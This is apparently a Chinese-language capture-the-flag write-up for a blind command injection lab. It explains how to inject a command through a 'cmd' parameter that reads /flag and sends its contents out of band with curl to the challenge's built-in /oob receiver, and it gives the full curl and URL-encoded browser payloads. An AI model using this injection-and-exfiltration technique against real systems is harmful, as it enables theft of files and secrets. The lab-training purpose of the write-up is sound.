# 23-cmdi-blind-oob

## 漏洞类型

Blind Command Injection，盲命令执行。

页面可以执行命令，但是命令结果不会直接显示在页面上。

题目提示：

```text
Flag 位置：/flag
OOB 接收器：/oob?c=<内容>
OOB 日志：/oob-log
```

所以思路是：

1. 通过 `cmd` 参数执行命令。
2. 用 `cat /flag` 读取 flag。
3. 因为页面不回显，所以用 curl 请求 `/oob` 把 flag 外带出来。
4. 再访问 `/oob-log` 查看结果。

## 手工复刻

### 1. 查看首页

```bash
curl 'http://目标地址/'
```

可以发现有命令执行参数：

```text
cmd
```

### 2. 执行命令并外带 flag

要执行的命令是：

```bash
sh -c 'curl -sG --data-urlencode c="$(cat /flag)" http://127.0.0.1/oob'
```

含义是：

1. `cat /flag` 读取 flag。
2. `--data-urlencode c="$(cat /flag)"` 把 flag 作为 `c` 参数进行 URL 编码。
3. 请求 `http://127.0.0.1/oob`，把结果写入题目内置 OOB 日志。

命令行复现：

```bash
curl --get 'http://目标地址/' \
  --data-urlencode 'cmd=sh -c '\''curl -sG --data-urlencode c="$(cat /flag)" http://127.0.0.1/oob'\'''
```

浏览器纯 GET 复现，直接访问：

```text
http://目标地址/?cmd=sh%20-c%20%27curl%20-sG%20--data-urlencode%20c%3D%22%24%28cat%20%2Fflag%29%22%20http%3A%2F%2F127.0.0.1%2Foob%27
```

页面显示“命令已执行”即可，因为本站不回显命令输出。

### 3. 查看 OOB 日志

```bash
curl 'http://目标地址/oob-log'
```

或者浏览器打开：

```text
http://目标地址/oob-log
```

可以看到 flag。

## 为什么用 --data-urlencode

flag 里有 `{}`，如果直接拼 URL，curl 可能会把花括号当成特殊语法处理。

所以用：

```bash
--data-urlencode c="$(cat /flag)"
```

更稳定。
